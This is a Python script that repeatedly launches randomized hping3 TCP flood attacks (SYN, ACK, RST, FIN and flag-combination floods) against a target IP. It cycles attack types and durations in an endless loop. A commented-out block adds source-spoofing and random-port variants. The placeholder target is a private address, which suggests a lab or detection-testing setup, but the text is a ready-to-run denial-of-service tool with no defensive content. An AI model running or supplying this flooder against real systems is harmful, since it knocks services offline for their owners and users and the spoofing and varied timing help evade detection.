import subprocess
import random
import time
import signal

def run_tcp_attack(target_ip):
    print(f"Starting TCP Attacks on {target_ip}...")

    tcp_attacks = [
        f"hping3 -S --flood -p 80 {target_ip}",
        f"hping3 -A --flood -p 80 {target_ip}",
        f"hping3 -R --flood -p 80 {target_ip}",
        f"hping3 -F --flood -p 80 {target_ip}",
        f"hping3 -F -P -U --flood -p 80 {target_ip}",
        f"hping3 -S -p 80 -d 10 --flood {target_ip}",
    ]

    # Uncomment to include additional TCP attack variations
    # tcp_attacks.extend([
    #     f"hping3 -S --flood -p 80 --rand-source {target_ip}",
    #     f"hping3 -A --flood -p 80 --rand-source {target_ip}",
    #     f"hping3 -R --flood -p 80 --rand-source {target_ip}",
    #     f"hping3 -F --flood -p 80 --rand-source {target_ip}",
    #     f"hping3 -F -P -U --flood -p 80 --rand-source {target_ip}",
    #     f"hping3 -S -p 80 -d 10 --flood --rand-source {target_ip}",
    #     f"hping3 -S -p {random.randint(1, 65535)} --flood --rand-source {target_ip}"
    #     f"hping3 -S -p 80 -d {random.randint(500, 1500)} --flood {target_ip}"
# ])

    try:
        i = 0 
        while True:
            sleep_intervals = [random.randint(5, 15), random.randint(15, 30), random.randint(35, 60)]
            random_attack = random.choice(tcp_attacks)

            print(f"Executing: {random_attack} for {sleep_intervals[i]} seconds...")
            process = subprocess.Popen(random_attack, shell=True, preexec_fn=lambda: signal.signal(signal.SIGPIPE, signal.SIG_DFL))

            time.sleep(sleep_intervals[i])
            i += 1
            if i == 3:
                i = 0

            process.terminate()
            process.wait()
            subprocess.call("killall hping3", shell=True)
            
            time.sleep(8)
    except KeyboardInterrupt:
        print("TCP Attacks Stopped!")

if __name__ == "__main__":
    TARGET_IP = "172.30.0.2"  # Replace with the actual target IP
    run_tcp_attack(TARGET_IP)
